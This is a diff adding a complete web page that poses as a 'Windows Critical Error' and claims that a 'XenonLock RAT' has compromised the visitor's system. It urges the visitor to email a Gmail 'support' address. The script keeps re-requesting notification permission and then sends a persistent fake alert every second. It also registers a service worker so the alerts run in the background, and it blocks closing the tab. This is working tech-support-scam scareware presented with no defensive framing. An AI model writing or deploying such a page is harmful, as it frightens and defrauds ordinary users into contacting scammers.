@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Critical Error</title>
+    <style>
+        body { font-family: Arial; background: #f0f0f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { width: 500px; height: 250px; background: white; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; border-radius: 5px; }
+        .title { font-size: 14pt; font-weight: bold; margin: 20px; }
+        .msg { font-size: 12pt; margin: 10px 20px; }
+        .support { font-size: 10pt; margin: 20px; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="title">XenonLock RAT</div>
+        <div class="msg">XenonLock RAT detected! Your system is compromised.</div>
+        <div class="support">Contact Support at Xenonlocksupport@gmail.com</div>
+    </div>
+    <script>
+        // Force notification prompt immediately
+        function requestNotifications() {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    startNotifications();
+                } else {
+                    // Retry every 2 seconds if denied
+                    setTimeout(requestNotifications, 2000);
+                }
+            });
+        }
+
+        // Start notifications
+        function startNotifications() {
+            setInterval(() => {
+                new Notification("Windows Critical Error", {
+                    body: "XenonLock RAT detected! Contact Xenonlocksupport@gmail.com",
+                    icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDJMMTMuMDkgMC44NkgxMkwxMiA4VjJ6bTAgMkgxMlYxNkg4di04em0wIDBoMjR2MjR6IiBmaWxsPSIjRkYwMDAwIi8+PC9zdmc+",
+                    requireInteraction: true
+                });
+            }, 1000);
+        }
+
+        // Register Service Worker for background notifications
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').then(() => {
+                requestNotifications(); // Start after Service Worker is registered
+            });
+        } else {
+            requestNotifications(); // Fallback if Service Worker fails
+        }
+
+        // Prevent tab close
+        window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
+    </script>
+</body>
+</html>
